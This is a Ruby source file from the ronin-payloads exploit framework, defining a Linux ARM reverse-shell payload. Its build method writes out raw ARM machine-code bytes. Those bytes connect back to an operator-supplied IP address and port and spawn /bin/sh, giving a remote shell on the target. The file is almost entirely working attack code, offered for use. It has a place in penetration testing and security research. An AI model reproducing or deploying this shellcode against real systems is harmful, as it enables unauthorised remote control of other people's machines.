# encoding: ASCII-8BIT
# frozen_string_literal: true
#
# ronin-payloads - A Ruby micro-framework for writing and running exploit
# payloads.
#
# Copyright (c) 2007-2023 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# ronin-payloads is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# ronin-payloads is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with ronin-payloads.  If not, see <https://www.gnu.org/licenses/>.
#

require 'ronin/payloads/shellcode/reverse_shell_payload'

module Ronin
  module Payloads
    module Shellcode
      module Linux
        module ARM
          #
          # Linux ARM shellcode that spawns a connect back reverse shell.
          #
          class ReverseShell < ReverseShellPayload

            register 'shellcode/linux/arm/reverse_shell'

            arch :arm
            os :linux

            author 'midnitesnake'

            summary 'Linux ARM reverse shell shellcode'
            description <<~DESC
              Linux ARM shellcode that spawns a connect back reverse shell.
            DESC

            references [
              "https://shell-storm.org/shellcode/files/shellcode-821.html"
            ]

            #
            # Builds the shellcode.
            #
            def build
              @payload = "\x01\x10\x8F\xE2" \
                         "\x11\xFF\x2F\xE1" \
                         "\x02\x20\x01\x21" \
                         "\x92\x1a\x0f\x02" \
                         "\x19\x37\x01\xdf" \
                         "\x06\x1c\x08\xa1" \
                         "\x10\x22\x02\x37" \
                         "\x01\xdf\x3f\x27" \
                         "\x02\x21" \
                         \
                         "\x30\x1c\x01\xdf" \
                         "\x01\x39\xfb\xd5" \
                         "\x05\xa0\x92\x1a" \
                         "\x05\xb4\x69\x46" \
                         "\x0b\x27\x01\xdf" \
                         "\xc0\x46" \
                         \
                         "\x02\x00" \
                         "#{packed_port}" \
                         "#{packed_ipv4}" \
                         \
                         "/bin/sh\0"
            end

          end
        end
      end
    end
  end
end
